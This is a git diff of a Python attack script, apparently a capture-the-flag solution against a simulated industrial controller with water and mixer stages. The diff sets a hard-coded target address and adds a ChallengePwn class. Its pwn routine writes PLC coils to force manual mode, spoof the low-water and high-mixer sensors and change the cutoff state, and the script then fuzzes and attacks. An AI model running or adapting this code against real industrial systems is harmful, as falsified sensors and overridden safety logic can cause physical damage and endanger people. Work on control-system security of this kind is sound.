@@ -4,7 +4,7 @@ import socket
 class Interface:
     def __init__(self):
         self.connection = None
-        self.host = "" # ip:port goes here!!
+        self.host = "167.172.62.255:30881"
         self.open_connection()
         
         self.debug = False
@@ -90,10 +90,10 @@ class Interface:
         self.write_coil(self.water, 206, state)
     
     def overwrite_low_sensor_water(self, state):
-        i.write_coil(i.water, 64, state)
+        self.write_coil(self.water, 64, state)
         
     def overwrite_high_sensor_mixer(self, state):
-        i.write_coil(i.mixer, 68, state)
+        self.write_coil(self.mixer, 68, state)
 
     def pwn(self):
         self.set_manual_mode_water(True)
@@ -104,6 +104,8 @@ class Interface:
         self.overwrite_high_sensor_mixer(True)
         self.cutoff(False)
 
+
+class ChallengePwn(Interface):
     def test_plu(self, plu):
         if not self.water:
             is_water = self.write_coil(plu, 53, True)
@@ -132,5 +134,6 @@ class Interface:
 
 
 
-i = Interface()
-i.fuzz_and_pwn()
+pwn = ChallengePwn()
+
+pwn.fuzz_and_pwn()
